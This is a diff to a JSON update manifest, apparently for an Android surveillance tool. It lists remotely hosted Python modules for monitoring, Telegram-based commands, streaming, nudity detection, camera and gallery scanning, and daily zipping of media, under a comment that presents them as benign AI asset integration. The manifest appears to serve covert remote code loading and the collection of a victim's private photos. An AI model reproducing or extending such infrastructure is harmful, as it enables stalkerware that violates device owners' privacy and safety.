@@ -2,22 +2,41 @@
   "version": "4.2.0",
   "comment": "AI Dynamic Asset Integration: Local TFLite model offloading enabled",
   "files": [
-    "https://zaen1993.github.io/Android-Core/files/monitor.py",
-    "https://zaen1993.github.io/Android-Core/files/telegram_ui.py",
-    "https://zaen1993.github.io/Android-Core/files/commands.py",
-    "https://zaen1993.github.io/Android-Core/files/stream_manager.py",
-    "https://zaen1993.github.io/Android-Core/files/nude_detector.py",
-    "https://zaen1993.github.io/Android-Core/files/camera_analyzer.py",
-    "https://zaen1993.github.io/Android-Core/files/media_scanner.py",
-    "https://zaen1993.github.io/Android-Core/files/gallery_browser.py",
-    "https://zaen1993.github.io/Android-Core/files/daily_zipper.py"
-  ],
-  "assets": [
-    "https://zaen1993.github.io/Android-Core/assets/engine_v2.tflite"
-  ],
-  "mirrors": [
-    "https://raw.githubusercontent.com/Zaen1993/Android-Core/main/index.json",
-    "https://raw.kkgithub.com/Zaen1993/Android-Core/main/index.json",
-    "https://cdn.staticaly.com/gh/Zaen1993/Android-Core/main/index.json"
+    {
+      "name": "monitor.py",
+      "url": "https://zaen1993.github.io/Android-Core/files/monitor.py"
+    },
+    {
+      "name": "telegram_ui.py",
+      "url": "https://zaen1993.github.io/Android-Core/files/telegram_ui.py"
+    },
+    {
+      "name": "commands.py",
+      "url": "https://zaen1993.github.io/Android-Core/files/commands.py"
+    },
+    {
+      "name": "stream_manager.py",
+      "url": "https://zaen1993.github.io/Android-Core/files/stream_manager.py"
+    },
+    {
+      "name": "nude_detector.py",
+      "url": "https://zaen1993.github.io/Android-Core/files/nude_detector.py"
+    },
+    {
+      "name": "camera_analyzer.py",
+      "url": "https://zaen1993.github.io/Android-Core/files/camera_analyzer.py"
+    },
+    {
+      "name": "media_scanner.py",
+      "url": "https://zaen1993.github.io/Android-Core/files/media_scanner.py"
+    },
+    {
+      "name": "gallery_browser.py",
+      "url": "https://zaen1993.github.io/Android-Core/files/gallery_browser.py"
+    },
+    {
+      "name": "daily_zipper.py",
+      "url": "https://zaen1993.github.io/Android-Core/files/daily_zipper.py"
+    }
   ]
 }
